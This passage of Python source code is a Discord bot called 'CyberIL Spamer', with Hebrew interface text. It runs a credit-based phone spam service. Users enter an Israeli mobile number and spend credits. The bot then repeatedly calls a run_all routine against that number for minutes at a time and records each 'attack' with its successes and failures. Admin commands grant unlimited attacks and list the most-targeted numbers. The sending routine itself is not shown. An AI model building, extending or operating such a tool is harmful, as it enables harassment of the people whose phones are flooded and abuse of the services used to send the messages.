        icon_url="https://cdn.discordapp.com/emojis/1345678901234567890.png"
    )
    
    embed.add_field(
        name="╭───────────────╮",
        value="",
        inline=False
    )
    
    embed.add_field(
        name="│  🎁 **CLAIM**",
        value="│  קרדיט אחד כל 24 שעות",
        inline=False
    )
    
    embed.add_field(
        name="│  💎 **REWARD**",
        value="│  +1 קרדיט",
        inline=False
    )
    
    embed.add_field(
        name="│  ⏰ **NEXT**",
        value="│  המתן 24 שעות לקבלת הבא",
        inline=False
    )
    
    embed.add_field(
        name="╰───────────────╯",
        value="",
        inline=False
    )
    
    embed.set_footer(
        text=f"© CYBERIL • {datetime.now().strftime('%d/%m/%Y')}",
        icon_url="https://cdn.discordapp.com/emojis/1345678901234567890.png"
    )
    
    return embed

class StopAttack(discord.ui.View):
    def __init__(self, user_id: int):
        super().__init__(timeout=None)
        self.user_id = user_id

    @discord.ui.button(label="⏹️ עצור", style=discord.ButtonStyle.danger, emoji="⏹️", row=0)
    async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id and not is_admin(interaction):
            await interaction.response.send_message("❌ לא הספאם שלך", ephemeral=True)
            return
        ev = active_missions.get(self.user_id)
        if ev:
            ev.set()
        button.disabled = True
        await interaction.response.edit_message(view=self)

class ConfirmAttack(discord.ui.View):
    def __init__(self, phone: str, cost: int, user_id: int):
        super().__init__(timeout=60)
        self.phone = phone
        self.cost = cost
        self.user_id = user_id
        self.is_running = False

    @discord.ui.button(label="✅ אישור", style=discord.ButtonStyle.success, emoji="✅", row=0)
    async def confirm_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ לא האישור שלך", ephemeral=True)
            return
        
        if self.is_running:
            await interaction.response.send_message("⚠️ הספאם כבר בתהליך", ephemeral=True)
            return
        
        self.is_running = True
        self.stop()
        
        await interaction.response.defer(ephemeral=True)
        
        for _ in range(self.cost):
            if not await use_credit(self.user_id):
                embed = discord.Embed(
                    title="❌ שגיאה",
                    description="אין מספיק קרדיטים",
                    color=COLOR_DANGER
                )
                await interaction.edit_original_response(embed=embed, view=None)
                return

        event = asyncio.Event()
        active_missions[self.user_id] = event

        embed = discord.Embed(
            title="🔄 ספאם בתהליך",
            description=f"**יעד:** {self.phone}\n**זמן:** {self.cost} דקות",
            color=COLOR_WARNING
        )
        await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))

        total_success = 0
        total_failed = 0
        start_time = time.time()
        end_time = start_time + (self.cost * 60)

        try:
            loop_count = 0
            while time.time() < end_time:
                if event.is_set():
                    break
                
                s, f = await run_all(self.phone)
                total_success += s
                total_failed += f
                loop_count += 1
                
                if loop_count % 5 == 0:
                    remaining = int((end_time - time.time()) / 60)
                    embed = discord.Embed(
                        title="🔄 ספאם בתהליך",
                        description=f"**יעד:** {self.phone}\n**נותר:** {remaining} דקות\n\n**✅ הצלחות:** {total_success}\n**❌ כשלונות:** {total_failed}",
                        color=COLOR_WARNING
                    )
                    await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
                
                await asyncio.sleep(0)

            await apply_cooldown(self.phone)
            active_missions.pop(self.user_id, None)
            stopped = event.is_set()

            await save_log(
                user_id=self.user_id,
                username=str(interaction.user),
                phone=self.phone,
                cost=self.cost,
                success=total_success,
                failed=total_failed,
                duration=self.cost * 60
            )

            bal = await format_balance(self.user_id)
            rate = int(total_success / (self.cost * 60)) if self.cost > 0 and total_success > 0 else 0
            
            if stopped:
                embed = discord.Embed(
                    title="⏹️ ספאם הופסק",
                    color=COLOR_WARNING
                )
            else:
                embed = discord.Embed(
                    title="✅ ספאם הושלם",
                    color=COLOR_SUCCESS
                )
            
            embed.add_field(name="📱 יעד", value=self.phone, inline=True)
            embed.add_field(name="⏱️ משך", value=f"{self.cost} דקות", inline=True)
            embed.add_field(name="💎 קרדיטים", value=bal, inline=True)
            embed.add_field(name="✅ הצלחות", value=str(total_success), inline=True)
            embed.add_field(name="❌ כשלונות", value=str(total_failed), inline=True)
            embed.add_field(name="⚡ קצב", value=f"{rate}/שנייה", inline=True)
            
            await interaction.edit_original_response(embed=embed, view=None)

        except Exception as e:
            active_missions.pop(self.user_id, None)
            embed = discord.Embed(
                title="❌ שגיאה",
                description=str(e)[:180],
                color=COLOR_DANGER
            )
            await interaction.edit_original_response(embed=embed, view=None)

    @discord.ui.button(label="❌ ביטול", style=discord.ButtonStyle.secondary, emoji="❌", row=0)
    async def cancel_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ לא שלך", ephemeral=True)
            return
        self.stop()
        embed = discord.Embed(
            title="❌ בוטל",
            description="לא נוכו קרדיטים",
            color=COLOR_INFO
        )
        await interaction.response.edit_message(embed=embed, view=None)

class LaunchModal(discord.ui.Modal, title="🚀 התחל ספאם"):
    phone = discord.ui.TextInput(
        label="מספר טלפון",
        placeholder="0501234567",
        min_length=10,
        max_length=10,
        style=discord.TextStyle.short
    )
    credits = discord.ui.TextInput(
        label="כמות קרדיטים",
        placeholder="1-100",
        min_length=1,
        max_length=3,
        style=discord.TextStyle.short
    )

    async def on_submit(self, interaction: discord.Interaction):
        phone_num = self.phone.value.strip()
        if not re.match(r"^05[0-9]{8}$", phone_num):
            embed = discord.Embed(
                title="❌ שגיאה",
                description="מספר לא תקין",
                color=COLOR_DANGER
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        try:
            credits_num = int(self.credits.value.strip())
            if credits_num < 1 or credits_num > MAX_CREDIT_SPEND:
                raise ValueError
        except ValueError:
            embed = discord.Embed(
                title="❌ שגיאה",
                description=f"כמות לא תקינה",
                color=COLOR_DANGER
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        uid = interaction.user.id

        bal = await fetch_balance(uid)
        unlimited = await has_unlimited(uid)

        if bal < credits_num and not unlimited:
            embed = discord.Embed(
                title="❌ שגיאה",
                description=f"חסרים קרדיטים",
                color=COLOR_DANGER
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        on_cd, remain = await check_cooldown(phone_num)
        if on_cd:
            embed = discord.Embed(
                title="⏱️ דיליי",
                description=f"המתן {remain} שניות",
                color=COLOR_WARNING
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        bal_str = await format_balance(uid)
        
        embed = discord.Embed(
            title="⚠️ אישור ספאם",
            description=f"**יעד:** {phone_num}\n**משך:** {credits_num} דקות\n**עלות:** {credits_num} קרדיטים\n**יתרה:** {bal_str}",
            color=COLOR_WARNING
        )
        
        await interaction.response.send_message(embed=embed, view=ConfirmAttack(phone=phone_num, cost=credits_num, user_id=uid), ephemeral=True)

class MainPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 התחל", style=discord.ButtonStyle.danger, emoji="🚀", row=0, custom_id="start_spam")
    async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        now = time.time()
        last = cooldown_tracker.get(interaction.user.id, 0)
        if now - last < LAUNCH_DELAY:
            rem = int(LAUNCH_DELAY - (now - last))
            embed = discord.Embed(
                title="⏱️ דיליי",
                description=f"המתן {rem} שניות",
                color=COLOR_WARNING
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        cooldown_tracker[interaction.user.id] = now
        await interaction.response.send_modal(LaunchModal())

    @discord.ui.button(label="💎 קרדיטים", style=discord.ButtonStyle.primary, emoji="💎", row=0, custom_id="check_balance")
    async def balance_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        bal_str = await format_balance(uid)
        stats = await get_user_stats(uid)

        embed = discord.Embed(
            title="💎 הקרדיטים שלי",
            description=f"**{bal_str}**",
            color=COLOR_ACCENT
        )
        
        if stats:
            embed.add_field(name="📊 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
            embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
            embed.add_field(name="❌ כשלונות", value=str(stats.get("total_failed", 0)), inline=True)

        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="📊 סטטוס", style=discord.ButtonStyle.secondary, emoji="📊", row=0, custom_id="stats")
    async def stats_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        stats = await get_global_stats()
        
        if not stats:
            embed = discord.Embed(
                title="📊 סטטיסטיקה",
                description="אין נתונים",
                color=COLOR_INFO
            )
            await interaction.followup.send(embed=embed, ephemeral=True)
            return

        embed = discord.Embed(
            title="📊 סטטיסטיקה גלובלית",
            color=COLOR_ACCENT
        )
        embed.add_field(name="🎯 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
        embed.add_field(name="👥 משתמשים", value=str(stats.get("unique_users", 0)), inline=True)
        embed.add_field(name="💎 קרדיטים", value=str(stats.get("total_cost", 0)), inline=True)
        embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
        embed.add_field(name="❌ כשלונות", value=str(stats.get("total_failed", 0)), inline=True)
        
        await interaction.followup.send(embed=embed, ephemeral=True)

class FreeCoins(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎁 קבל", style=discord.ButtonStyle.success, emoji="🎁", row=0, custom_id="claim_free")
    async def claim_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        now = time.time()
        
        await interaction.response.defer(ephemeral=True)

        doc = await settings_collection.find_one({"_id": uid, "type": "free_credits"})
        if doc:
            diff = now - doc.get("last_claim", 0)
            if diff < 86400:
                hours = int((86400 - diff) // 3600)
                minutes = int(((86400 - diff) % 3600) // 60)
                embed = discord.Embed(
                    title="⏱️ קרדיטים חינם",
                    description=f"תוכל לקבל קרדיט נוסף בעוד {hours} שעות ו-{minutes} דקות",
                    color=COLOR_WARNING
                )
                await interaction.followup.send(embed=embed, ephemeral=True)
                return

        await add_credits(uid, 1)
        await settings_collection.update_one({"_id": uid, "type": "free_credits"}, {"$set": {"last_claim": now}}, upsert=True)

        new_bal = await format_balance(uid)
        
        embed = discord.Embed(
            title="🎁 קיבלת קרדיט",
            description=f"+1 קרדיט\n\n**יתרה:** {new_bal}",
            color=0xFFD700
        )
        
        await interaction.followup.send(embed=embed, ephemeral=True)

async def get_user_stats(user_id: int):
    pipeline = [
        {"$match": {"user_id": user_id}},
        {"$group": {
            "_id": "$user_id",
            "total_attacks": {"$sum": 1},
            "total_cost": {"$sum": "$cost"},
            "total_success": {"$sum": "$success_count"},
            "total_failed": {"$sum": "$failed_count"},
        }}
    ]
    result = await logs_collection.aggregate(pipeline).to_list(1)
    return result[0] if result else None

async def get_global_stats():
    pipeline = [
        {"$group": {
            "_id": None,
            "total_attacks": {"$sum": 1},
            "total_cost": {"$sum": "$cost"},
            "total_success": {"$sum": "$success_count"},
            "total_failed": {"$sum": "$failed_count"},
            "unique_users": {"$addToSet": "$user_id"}
        }}
    ]
    result = await logs_collection.aggregate(pipeline).to_list(1)
    if result:
        result[0]["unique_users"] = len(result[0]["unique_users"])
        return result[0]
    return None

async def get_user_logs(user_id: int, limit: int = 20):
    cursor = logs_collection.find({"user_id": user_id}).sort("timestamp", -1).limit(limit)
    return await cursor.to_list(length=limit)

async def get_all_logs(limit: int = 100):
    cursor = logs_collection.find().sort("timestamp", -1).limit(limit)
    return await cursor.to_list(length=limit)

async def get_top_targets(limit: int = 10):
    pipeline = [
        {"$group": {
            "_id": "$phone",
            "count": {"$sum": 1},
            "success_total": {"$sum": "$success_count"}
        }},
        {"$sort": {"count": -1}},
        {"$limit": limit}
    ]
    return await logs_collection.aggregate(pipeline).to_list(length=limit)

@client.event
async def on_ready():
    client.add_view(MainPanel())
    client.add_view(FreeCoins())
    await tree.sync()
    print(f"✅ CyberIL Spamer פעיל → {client.user}")
    print(f"📡 מחובר ל-{len(client.guilds)} שרתים")

    await asyncio.sleep(2)

    try:
        main_ch = client.get_channel(PANEL_CHANNEL)
        if main_ch:
            await main_ch.purge(limit=5)
            await main_ch.send(embed=create_panel(), view=MainPanel())
            print(f"✅ פאנל נשלח ל-{main_ch.name}")

        gift_ch = client.get_channel(GIFT_CHANNEL)
        if gift_ch:
            await gift_ch.purge(limit=5)
            await gift_ch.send(embed=create_gift_panel(), view=FreeCoins())
            print(f"✅ הודעת קרדיטים נשלחה ל-{gift_ch.name}")

    except Exception as e:
        print(f"❌ שגיאה: {e}")

@tree.command(name="credit", description="בדוק יתרת קרדיטים")
async def cmd_credit(interaction: discord.Interaction):
    await cmd_credits(interaction)

@tree.command(name="credits", description="בדוק יתרת קרדיטים")
@app_commands.describe(member="משתמש לבדיקה")
async def cmd_credits(interaction: discord.Interaction, member: discord.Member = None):
    target = member or interaction.user
    bal = await format_balance(target.id)
    stats = await get_user_stats(target.id)

    embed = discord.Embed(
        title="💎 קרדיטים",
        description=f"{target.mention} — **{bal}**",
        color=COLOR_ACCENT
    )
    if stats:
        embed.add_field(name="📊 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
        embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
        embed.add_field(name="❌ כשלונות", value=str(stats.get("total_failed", 0)), inline=True)

    await interaction.response.send_message(embed=embed)

@tree.command(name="addcredit", description="[ADMIN] הוסף קרדיטים")
@app_commands.describe(member="משתמש", amount="כמות")
async def cmd_addcredit(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    if amount <= 0:
        await interaction.response.send_message("❌ כמות חייבת להיות חיובית", ephemeral=True)
        return
    await add_credits(member.id, amount)
    new_bal = await format_balance(member.id)
    embed = discord.Embed(title="✅ קרדיטים נוספו", color=COLOR_SUCCESS)
    embed.add_field(name="משתמש", value=member.mention, inline=True)
    embed.add_field(name="נוסף", value=str(amount), inline=True)
    embed.add_field(name="יתרה", value=new_bal, inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="removecredit", description="[ADMIN] הסר קרדיטים")
@app_commands.describe(member="משתמש", amount="כמות")
async def cmd_removecredit(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    if amount <= 0:
        await interaction.response.send_message("❌ כמות חייבת להיות חיובית", ephemeral=True)
        return
    await remove_credits(member.id, amount)
    new_bal = await format_balance(member.id)
    embed = discord.Embed(title="🗑️ קרדיטים הוסרו", color=COLOR_WARNING)
    embed.add_field(name="משתמש", value=member.mention, inline=True)
    embed.add_field(name="הוסר", value=str(amount), inline=True)
    embed.add_field(name="יתרה", value=new_bal, inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="lifetime", description="[ADMIN] הענק ללא הגבלה")
@app_commands.describe(member="משתמש")
async def cmd_lifetime(interaction: discord.Interaction, member: discord.Member):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer()
    await set_unlimited(member.id, True)
    embed = discord.Embed(title="♾️ ללא הגבלה הוענק", description=f"{member.mention} קיבל ללא הגבלה", color=COLOR_SUCCESS)
    await interaction.followup.send(embed=embed)

@tree.command(name="removelifetime", description="[ADMIN] הסר ללא הגבלה")
@app_commands.describe(member="משתמש")
async def cmd_removelifetime(interaction: discord.Interaction, member: discord.Member):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer()
    await set_unlimited(member.id, False)
    embed = discord.Embed(title="♾️ ללא הגבלה הוסר", description=f"{member.mention} איבד את ה-lifetime", color=COLOR_WARNING)
    await interaction.followup.send(embed=embed)

@tree.command(name="freecredits", description="[ADMIN] שלח הודעת קרדיטים")
async def cmd_freecredits(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.send_message(embed=create_gift_panel(), view=FreeCoins())

@tree.command(name="giveall", description="[ADMIN] תן לכולם")
@app_commands.describe(amount="כמות")
async def cmd_giveall(interaction: discord.Interaction, amount: int):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    if amount <= 0:
        await interaction.followup.send("❌ כמות חייבת להיות חיובית", ephemeral=True)
        return
    await users_collection.update_many({}, {"$inc": {"credits": amount}})
    await interaction.followup.send(f"✅ ניתנו {amount} קרדיטים לכולם", ephemeral=True)

@tree.command(name="transfer", description="העבר קרדיטים")
@app_commands.describe(member="מקבל", amount="כמות")
async def cmd_transfer(interaction: discord.Interaction, member: discord.Member, amount: int):
    await interaction.response.defer(ephemeral=True)
    if amount < 20:
        await interaction.followup.send("❌ מינימום העברה 20", ephemeral=True)
        return
    if interaction.user.id == member.id:
        await interaction.followup.send("❌ אי אפשר להעביר לעצמך", ephemeral=True)
        return

    uid = interaction.user.id
    if await has_unlimited(uid):
        await interaction.followup.send("❌ משתמשי lifetime לא יכולים להעביר", ephemeral=True)
        return

    bal = await fetch_balance(uid)
    if bal < amount:
        await interaction.followup.send(f"❌ אין מספיק קרדיטים", ephemeral=True)
        return

    await remove_credits(uid, amount)
    await add_credits(member.id, amount)

    embed = discord.Embed(title="💸 העברה הושלמה", color=COLOR_SUCCESS)
    embed.add_field(name="מאת", value=interaction.user.mention, inline=True)
    embed.add_field(name="אל", value=member.mention, inline=True)
    embed.add_field(name="כמות", value=f"{amount}", inline=True)
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="mylogs", description="הצג לוגים")
async def cmd_mylogs(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    logs = await get_user_logs(interaction.user.id, 10)

    if not logs:
        await interaction.followup.send("📭 אין מתקפות", ephemeral=True)
        return

    embed = discord.Embed(title="📋 לוגים", color=COLOR_INFO)
    for log in logs:
        embed.add_field(
            name=f"{log['date']} {log['time']}",
            value=f"📱 {log['phone']}\n✅ {log['success_count']} | ❌ {log['failed_count']} | 💎 {log['cost']}",
            inline=False
        )

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="checkstatus", description="[ADMIN] בדוק סטטוס")
async def cmd_checkstatus(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    test_num = "0506500708"
    success, failed = await run_all(test_num)

    embed = discord.Embed(title="📊 בדיקת מערכת", color=COLOR_INFO)
    embed.add_field(name="✅ הצלחות", value=str(success), inline=True)
    embed.add_field(name="❌ כשלונות", value=str(failed), inline=True)
    embed.add_field(name="🔢 סה\"כ", value=str(success + failed), inline=True)

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="attacklogs", description="[ADMIN] לוגים")
@app_commands.describe(limit="כמות")
async def cmd_attacklogs(interaction: discord.Interaction, limit: int = 10):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    logs = await get_all_logs(min(limit, 50))

    if not logs:
        await interaction.followup.send("📭 אין לוגים", ephemeral=True)
        return

    embed = discord.Embed(title="📋 לוגים אחרונים", color=COLOR_INFO)
    for log in logs[:10]:
        embed.add_field(
            name=f"{log['username']} | {log['date']} {log['time']}",
            value=f"📱 {log['phone']}\n✅ {log['success_count']} | ❌ {log['failed_count']} | 💎 {log['cost']}",
            inline=False
        )

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="topnumbers", description="[ADMIN] מספרים מובילים")
async def cmd_topnumbers(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    top = await get_top_targets(10)

    if not top:
        await interaction.followup.send("📭 אין נתונים", ephemeral=True)
        return

    embed = discord.Embed(title="🎯 מספרים מובילים", color=COLOR_INFO)
    for i, item in enumerate(top, 1):
        embed.add_field(
            name=f"{i}. {item['_id']}",
            value=f"מתקפות: {item['count']} | הצלחות: {item['success_total']}",
            inline=False
        )

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="globalstats", description="[ADMIN] סטטיסטיקה גלובלית")
async def cmd_globalstats(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    stats = await get_global_stats()

    if not stats:
        await interaction.followup.send("📭 אין נתונים", ephemeral=True)
        return

    embed = discord.Embed(title="📊 סטטיסטיקה גלובלית", color=COLOR_INFO)
    embed.add_field(name="🎯 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
    embed.add_field(name="👥 משתמשים", value=str(stats.get("unique_users", 0)), inline=True)
    embed.add_field(name="💎 קרדיטים", value=str(stats.get("total_cost", 0)), inline=True)
    embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
    embed.add_field(name="❌ כשלונות", value=str(stats.get("total_failed", 0)), inline=True)

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="restart", description="[ADMIN] אתחל בוט")
async def cmd_restart(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.send_message("🔄 מאתחל...", ephemeral=True)
    await client.close()
    os.execv(sys.executable, [sys.executable] + sys.argv)

if __name__ == "__main__":
    client.run(TOKEN)
